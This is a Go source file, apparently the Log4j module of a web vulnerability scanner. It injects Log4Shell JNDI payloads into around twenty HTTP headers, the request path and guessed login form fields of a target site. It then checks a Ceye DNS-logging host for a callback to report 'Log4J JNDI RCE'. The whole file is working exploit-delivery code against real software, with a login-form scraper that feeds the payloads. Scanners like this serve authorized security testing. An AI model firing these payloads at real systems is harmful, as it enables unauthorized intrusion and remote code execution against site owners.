package log4j

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"regexp"
	"strings"
)

func Check(u string) bool {
	domainx, unamekey, passkey := getinputurl(u)
	domainx = append(domainx, u)
	for _, domain := range domainx {
		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
			for _, payload := range log4jJndiPayloads {
				randomstr := pkg.RandomStr()
				payload = strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1)
				header := make(map[string]string)
				header["Content-Type"] = "application/x-www-form-urlencoded"
				header["User-Agent"] = payload
				header["Referer"] = payload
				header["X-Client-IP"] = payload
				header["X-Remote-IP"] = payload
				header["X-Remote-Addr"] = payload
				header["X-Forwarded-For"] = payload
				header["X-Originating-IP"] = payload
				header["Originating-IP"] = payload
				header["CF-Connecting_IP"] = payload
				header["True-Client-IP"] = payload
				header["Originating-IP"] = payload
				header["X-Real-IP"] = payload
				header["Forwarded"] = payload
				header["X-Api-Version"] = payload
				header["X-Wap-Profile"] = payload
				header["Contact"] = payload
				header["Forwarded"] = payload
				header["X-Device"] = payload
				header["Token"] = payload
				header["Cookie"] = "JSESSIONID=" + payload
				if _, err := pkg.HttpRequset(domain+"/"+payload, "GET", payload, false, header); err == nil {
					if pkg.Dnslogchek(randomstr) {
						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
						return true
					}
				}
				if _, err := pkg.HttpRequset(domain, "POST", unamekey+"="+payload+"&"+passkey+"="+payload, false, header); err == nil {
					if pkg.Dnslogchek(randomstr) {
						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
						return true
					}
				}
			}
		}
	}
	return false
}

func getinputurl(domainurl string) (domainurlx []string, usernamekey string, passwordkey string) {
	usernamekey = "username"
	passwordkey = "password"
	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil, usernamekey, passwordkey
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil, usernamekey, passwordkey
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	usernamelist := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?name[\w\[\]]*?|[\w\[\]]*?Name[\w\[\]]*?|[\w\[\]]*?user[\w\[\]]*?|[\w\[\]]*?User[\w\[\]]*?|[\w\[\]]*?USER[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
	if usernamelist != nil {
		usernamekey = usernamelist[len(usernamelist)-1:][0]
	} else {
		usernamelist2 := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?log[\w\[\]]*?|[\w\[\]]*?Log[\w\[\]]*?|[\w\[\]]*?LoG[\w\[\]]*?|[\w\[\]]*?LOG[\w\[\]]*?|[\w\[\]]*?account[\w\[\]]*?|[\w\[\]]*?Account[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
		if usernamelist2 != nil {
			usernamekey = usernamelist2[len(usernamelist2)-1:][0]
		}
	}
	passlist := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?pass[\w\[\]]*?|[\w\[\]]*?Pass[\w\[\]]*?|[\w\[\]]*?PASS[\w\[\]]*?|[\w\[\]]*?pwd[\w\[\]]*?|[\w\[\]]*?Pwd[\w\[\]]*?|[\w\[\]]*?PWD[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
	if passlist != nil {
		passwordkey = passlist[len(passlist)-1:][0]
	} else {
		passlist2 := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?mima[\w\[\]]*?|[\w\[\]]*?word[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
		if passlist2 != nil {
			passwordkey = passlist2[len(passlist2)-1:][0]
		}
	}
	return loginurl, usernamekey, passwordkey
}
